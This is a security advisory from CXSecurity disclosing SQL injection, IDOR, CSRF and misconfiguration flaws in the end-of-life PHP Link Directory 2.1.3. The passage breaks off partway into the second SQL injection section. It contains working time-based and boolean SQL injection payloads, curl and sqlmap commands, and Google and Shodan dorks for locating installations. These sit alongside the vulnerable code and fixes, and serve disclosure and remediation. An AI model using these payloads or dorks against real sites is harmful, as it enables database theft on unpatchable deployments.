---
title: phpLD 2.1.3 (EOL) has authenticated SQLi in admin/dir_validate.php (CATEGORY_ID) and admin ORDER BY (sort), unauthenticated IDO
url: https://cxsecurity.com/issue/WLB-2026060007
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-06-15
fetch_date: 2026-06-16T07:14:40.477999
---

# phpLD 2.1.3 (EOL) has authenticated SQLi in admin/dir_validate.php (CATEGORY_ID) and admin ORDER BY (sort), unauthenticated IDO

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **phpLD 2.1.3 (EOL) has authenticated SQLi in admin/dir\_validate.php (CATEGORY\_ID) and admin ORDER BY (sort), unauthenticated IDOR in add\_reciprocal.php, CSRF on admin link actions via GET, and exposed install/ after deployment. Verified locally on v2.1.3.** **2026.06.15**  Credit:  **[Xasthur](https://cxsecurity.com/author/Xasthur/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")**  **[**Dork:** PHP Link Directory" inurl:submit.php OR intitle:"phpLinkDirectory" OR inurl:add\_reciprocal.php](https://cxsecurity.com/dorks/)** | |

Title: PHP Link Directory (phpLD) 2.1.x Multiple Vulnerabilities
Product: PHP Link Directory (phpLD)
Vendor: NetCreated, Inc. / phplinkdirectory.com
Version: 2.1.3 (affects 2.1.0 through 2.1.3; entire 2.1.x branch likely)
Status: End-of-Life (EOL) — no official patch expected from vendor
Type: SQL Injection, IDOR, CSRF, Security Misconfiguration
Risk: High (authenticated SQLi) / Medium (unauthenticated IDOR)
Discovered: 2026-06-14
Published: 2026-06-14
Advisory: PHPLD-2026-001
Google Dork:
"PHP Link Directory" inurl:submit.php OR intitle:"phpLinkDirectory" OR
inurl:add\_reciprocal.php OR "Powered by: php Link Directory"
Shodan Dork:
http.html:"PHP Link Directory" http.component:php
================================================================================
EXECUTIVE SUMMARY
================================================================================
PHP Link Directory (phpLD) version 2.1.3 contains multiple security
vulnerabilities in the administrative interface and public-facing
components. The software is legacy/EOL; administrators should migrate to
a maintained platform or apply manual patches.
Confirmed issues:
[1] SQL Injection — admin/dir\_validate.php (POST parameter CATEGORY\_ID)
[2] SQL Injection — admin panel ORDER BY clause (GET parameter sort)
[3] IDOR — add\_reciprocal.php (unauthenticated link record update)
[4] CSRF — admin/dir\_links\_edit.php (state-changing GET requests)
[5] Security Misconfiguration — exposed install/ directory post-deploy
NOT vulnerable (verified — false positive prevention):
- index.php?q= (search uses $db->qstr())
- submit.php POST fields including CAPTCHA (parameterized / session check)
All PoCs below use http://127.0.0.1/phpld/ for authorized local testing.
================================================================================
CVSS v3.1 (approximate)
================================================================================
[1][2] SQL Injection (admin): CVSS 8.1 AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
[3] IDOR (public): CVSS 5.3 AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
[4] CSRF (admin): CVSS 6.5 AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
[5] Exposed install/: CVSS 5.3 AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
================================================================================
TEST ENVIRONMENT
================================================================================
Software : PHP Link Directory 2.1.3
PHP : 5.x – 7.x (legacy codebase)
DBMS : MySQL / MariaDB
Base URL : http://127.0.0.1/phpld/
Prerequisites:
- Installation completed via /install/
- At least one admin or editor account
- At least one link in a category (for dir\_validate SQLi test)
- At least one link with empty RECPR\_URL field (for IDOR test)
================================================================================
[1] SQL INJECTION — admin/dir\_validate.php (CATEGORY\_ID)
================================================================================
Severity : High
CWE : CWE-89 (SQL Injection)
Auth : Required (admin or editor session)
Method : POST
Parameter: CATEGORY\_ID
Affected file: admin/dir\_validate.php (approx. line 122)
Vulnerable code:
if ($\_REQUEST['CATEGORY\_ID'] > 0) {
$where = " WHERE CATEGORY\_ID = '".$\_REQUEST['CATEGORY\_ID']."'";
}
$rs = $db->Execute("SELECT `ID`, `URL`, `RECPR\_URL`, `STATUS`, `ID`,
`RECPR\_REQUIRED` FROM `{$tables['link']['name']}` {$where}");
The CATEGORY\_ID value is concatenated directly into the SQL query without
sanitization or prepared statements.
--- Proof of Concept: Time-based blind ---
Step 1 — Authenticate and save session cookie:
curl -c cookies.txt -X POST \
"http://127.0.0.1/phpld/admin/login.php" \
-d "user=admin&pass=admin&submit=Login" -L
Step 2 — Trigger MySQL SLEEP (expect ~5 second response delay):
curl -b cookies.txt -X POST \
"http://127.0.0.1/phpld/admin/dir\_validate.php" \
-d "submit=Start&VALIDATE\_LINKS=1&VALIDATE\_RECPR=0&CATEGORY\_ID=1'+AND+SLEEP(5)--+-"
Step 3 — Boolean-based confirmation:
CATEGORY\_ID=1' OR '1'='1 (returns all links in category scope)
CATEGORY\_ID=1' AND '1'='2 (returns no links)
--- Proof of Concept: sqlmap ---
sqlmap -u "http://127.0.0.1/phpld/admin/dir\_validate.php" \
--auth-url="http://127.0.0.1/phpld/admin/login.php" \
--auth-data="user=admin&pass=admin&submit=Login" \
--auth-type=POST \
--data="submit=Start&VALIDATE\_LINKS=1&VALIDATE\_RECPR=0&CATEGORY\_ID=1" \
-p CATEGORY\_ID \
--dbms=mysql --prefix="1'" --suffix="-- -" \
--batch --random-agent --time-sec=5
Impact:
Full read/write access to the application database as the configured DB
user, including PLD\_USER (admin password hashes), PLD\_LINK, PLD\_CATEGORY.
Remediation:
Replace with: $where = " WHERE CATEGORY\_ID = ".$db->qstr($\_REQUEST['CATEGORY\_ID']);
Or validate: $cid = intval($\_REQUEST['CATEGORY\_ID']);
================================================================================
[2] SQL INJECTION — admin ORDER BY (sort parameter)
================================================================================
Severity : High
CWE : CWE-89 (SQL Injection)
Auth : Required (admin or editor session)
Method : GET (value stored in PHP session, executed on subsequent request)
Parameter: sort
Affected files:
admin/init.php (approx. line 216)
admin/conf\_users.php, admin/conf\_payment.php, admin/email\_message.php,
admin/email\_sent\_view.php, admin/dir\_links.php, admin/dir\_categs.php,
admin/dir\_approve\_links.php, admin/dir\_approve\_categs.php
Vulnerable flow:
// admin/...